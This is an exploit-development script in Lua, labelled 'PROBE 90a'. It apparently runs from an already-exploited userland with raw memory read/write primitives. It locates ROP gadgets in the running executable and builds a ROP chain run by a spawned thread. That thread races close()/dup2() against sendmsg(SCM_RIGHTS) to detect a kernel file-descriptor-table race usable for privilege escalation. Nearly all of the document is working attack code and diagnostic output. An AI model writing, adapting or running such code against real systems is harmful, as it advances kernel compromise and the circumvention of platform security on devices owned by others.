-- CRASH_CLASS: HIGH
-- PROBE 90a: Race close()+dup() vs sendmsg(SCM_RIGHTS)
--
-- Thread A (ROP child): tight close(t1)+dup(donor) loop — toggles fd t1
-- between AF_UNIX (target) and AF_INET (donor) file structs.
-- Thread B (Lua main): sendmsg(SCM_RIGHTS, t1) in tight loop — captures
-- whatever file struct is on t1 at the moment fhold() runs.
--
-- Detection: drain received fds, getsockname each. AF_UNIX(1)=target,
-- AF_INET(2)=donor. If any donor appears: sendmsg captured the wrong
-- file struct mid-swap → fd table race window exists.

print("=== PROBE 90a: FD CLOSE/SENDMSG RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(num)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=num
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local tc=mk(430)
local tk=mk(433)
local mm=mk(477)
local c624=mk(624)
local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end

-- eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0
local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
print("gadgets OK")

-- thr_create context offsets
local _DI=0x048;local _SI=0x050;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local STSZ=0x10000

-- Block SIGPIPE
local sa=memory.alloc(32); z(sa,32); wq(sa,uint64(1))
local sigr=N(native.fcall_with_rax(stub,416,13,N(sa),0))
print("sigaction(SIGPIPE,IGN)="..sigr)

-- SCM_RIGHTS helpers
local function scm_send(sock_fd, fd_to_pass)
    local iov_buf=memory.alloc(8); memory.write_byte(iov_buf,0x42)
    local iov=memory.alloc(16)
    wq(iov,uint64(N(iov_buf))); wq(iov+8,uint64(1))
    local cmsg=memory.alloc(32); z(cmsg,32)
    wd(cmsg,20); wd(cmsg+4,0xFFFF); wd(cmsg+8,1); wd(cmsg+16,fd_to_pass)
    local msg=memory.alloc(64); z(msg,64)
    wq(msg+0x10,uint64(N(iov))); wd(msg+0x18,1)
    wq(msg+0x20,uint64(N(cmsg))); wd(msg+0x28,24)
    return N(native.fcall_with_rax(stub,28,sock_fd,N(msg),0x20080))
end

local function scm_recv(sock_fd)
    local rb=memory.alloc(8)
    local ri=memory.alloc(16); wq(ri,uint64(N(rb))); wq(ri+8,uint64(1))
    local rc=memory.alloc(128); z(rc,128)
    local rm=memory.alloc(64); z(rm,64)
    wq(rm+0x10,uint64(N(ri))); wd(rm+0x18,1)
    wq(rm+0x20,uint64(N(rc))); wd(rm+0x28,128)
    local rr=N(native.fcall_with_rax(stub,27,sock_fd,N(rm),0x80))
    if rr<=0 then return -1 end
    local off=0
    while off<112 do
        local clen=rd(rc+off) or 0
        if clen<12 then break end
        local ctype=rd(rc+off+8) or 0
        if ctype==1 then
            local fv=rd(rc+off+16) or 0
            if fv>0 and fv<10000 then return fv end
            return -1
        end
        local aligned=math.floor((clen+7)/8)*8
        if aligned==0 then break end
        off=off+aligned
    end
    return -1
end

-- Detect socket family via getsockname (sys 32)
local function sock_family(fd)
    local ab=memory.alloc(32); z(ab,32)
    local lp=memory.alloc(4); wd(lp,32)
    local rv=N(native.fcall_with_rax(stub,32,fd,N(ab),N(lp)))
    if rv~=0 then return -1 end
    local raw=rd(ab) or 0
    return math.floor(raw / 256) % 256
end

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- SETUP
-- ============================================================
print("")
print("--- SETUP ---")

-- Transport socketpair for SCM_RIGHTS
local sv=memory.alloc(8); wq(sv,uint64(0))
local spr=N(native.fcall_with_rax(stub,135,1,1,0,N(sv)))
local sp=rd(sv); local pr=rd(sv+4)
print("transport: sp="..sp.." pr="..pr.." rv="..spr)
if spr~=0 then print("FAIL transport") return end

-- Target socketpair — t1 is the racing fd
wq(sv,uint64(0))
local tpr=N(native.fcall_with_rax(stub,135,1,1,0,N(sv)))
local t1=rd(sv); local t2=rd(sv+4)
print("target: t1="..t1.." t2="..t2.." rv="..tpr)
if tpr~=0 then print("FAIL target") return end

local t1_fam=sock_family(t1)
print("t1 family="..t1_fam)

-- Donor: AF_INET SOCK_STREAM
local donor=N(native.fcall_with_rax(stub,97,2,1,0))
print("donor fd="..donor)
if donor<=0 then print("FAIL donor socket") return end

local don_fam=sock_family(donor)
print("donor family="..don_fam)

-- Gate test: verify SCM_RIGHTS works
local gr=scm_send(sp,t1)
print("gate send="..gr)
if gr<=0 then print("FAIL gate send") return end
local gfd=scm_recv(pr)
print("gate recv fd="..gfd)
if gfd>0 then
    local gf=sock_family(gfd)
    print("gate family="..gf.." (expect 1=AF_UNIX)")
    native.fcall_with_rax(stub,6,gfd)
end

-- ============================================================
-- BUILD ROP CHAIN: [close(t1) + dup(donor)] × N
-- ============================================================
print("")
print("--- BUILD ROP ---")

local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap stack") return end

local off=0
-- Each cycle: close(t1) [24B] + dup2(donor, t1) [32B] = 56 bytes
local ncycles=math.floor((STSZ-96)/56)
for i=1,ncycles do
    -- close(t1): sys 6, rdi=t1
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(t1)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(6)); off=off+8
    wq(stk+off,SA); off=off+8
    -- dup2(donor, t1): sys 90, rdi=donor, rsi=t1
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(donor)); off=off+8
    wq(stk+off,PRSI); off=off+8
    wq(stk+off,uint64(t1)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(90)); off=off+8
    wq(stk+off,SA); off=off+8
end

-- nanosleep(999s) tail
local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8
wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8
wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8

print(ncycles.." close+dup cycles in chain")

-- ============================================================
-- SPAWN CHILD
-- ============================================================
print("")
print("--- RACE ---")

local ctx=memory.alloc(0x200); z(ctx,0x200)
wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
wq(ctx+_TP,uint64(0x10000))
wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
wq(ctx+_IP,SA); wq(ctx+_SP,uint64(N(stk)))
-- First call: close(t1) → rax=6, rdi=t1
wq(ctx+_AX,uint64(6))
wq(ctx+_DI,uint64(t1))

local tb=memory.alloc(8); wq(tb,uint64(0))
local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
local tid=rq(tb)
print("thr_create rv="..(ok_t and tostring(N(rv_t)) or "X").." tid="..q(tid))

-- Brief delay for child to start
local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(5000000))
pcall(function() mk(240)(uint64(sl),uint64(0)) end)

print("child alive="..tostring(alive(tid)))

-- Main thread: pump SCM_RIGHTS sends
local vm0=vmc()
local send_ok=0
local send_fail=0

for i=1,500 do
    local r=scm_send(sp,t1)
    if r>0 then
        send_ok=send_ok+1
    else
        send_fail=send_fail+1
    end
end

local vm1=vmc()
print("sends: ok="..send_ok.." fail="..send_fail)
print("VM: "..vm0.." -> "..vm1.." d="..(vm1-vm0))
print("child alive="..tostring(alive(tid)))

-- ============================================================
-- DRAIN & DETECT
-- ============================================================
print("")
print("--- DRAIN ---")

local target_match=0
local donor_match=0
local unknown_match=0
local recv_fail=0

for i=1,send_ok+100 do
    local fd=scm_recv(pr)
    if fd<=0 then break end
    local fam=sock_family(fd)
    if fam==1 then
        target_match=target_match+1
    elseif fam==2 then
        donor_match=donor_match+1
        if donor_match<=5 then
            print("  *** DONOR fd="..fd.." family="..fam.." at recv #"..i.." ***")
        end
    else
        unknown_match=unknown_match+1
        if unknown_match<=3 then
            print("  unknown fd="..fd.." family="..fam)
        end
    end
    native.fcall_with_rax(stub,6,fd)
end

print("target(AF_UNIX)="..target_match)
print("donor(AF_INET)="..donor_match)
print("unknown="..unknown_match)

if donor_match>0 then
    print("")
    print("*** RACE DETECTED: "..donor_match.." sends captured donor file struct ***")
    print("*** fd table lock has a race window in sendmsg(SCM_RIGHTS) ***")
else
    print("")
    print("no race detected — fd table properly locked during fhold")
end

-- ============================================================
-- CLEANUP
-- ============================================================
print("")
print("--- CLEANUP ---")
native.fcall_with_rax(stub,6,sp)
native.fcall_with_rax(stub,6,pr)
native.fcall_with_rax(stub,6,t2)
native.fcall_with_rax(stub,6,donor)
-- t1 may be in any state after racing — try close
pcall(function() native.fcall_with_rax(stub,6,t1) end)

-- Kill child
if tid and N(tid)>0 then
    pcall(function() tk(tid,uint64(9)) end)
end

print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 90a COMPLETE ===")
